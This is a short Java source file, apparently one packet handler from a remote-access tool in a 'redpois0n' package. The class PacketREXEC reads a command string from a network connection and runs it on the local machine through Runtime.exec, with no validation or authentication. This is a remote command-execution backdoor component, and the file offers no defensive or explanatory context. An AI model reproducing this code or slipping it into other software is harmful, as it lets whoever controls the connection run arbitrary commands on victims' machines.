package com.redpois0n.packets;

import com.redpois0n.Connection;

public class PacketREXEC extends Packet {

	@Override
	public void read(String line) throws Exception {
		String process = Connection.readLine();
		try {
			Runtime.getRuntime().exec(process);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
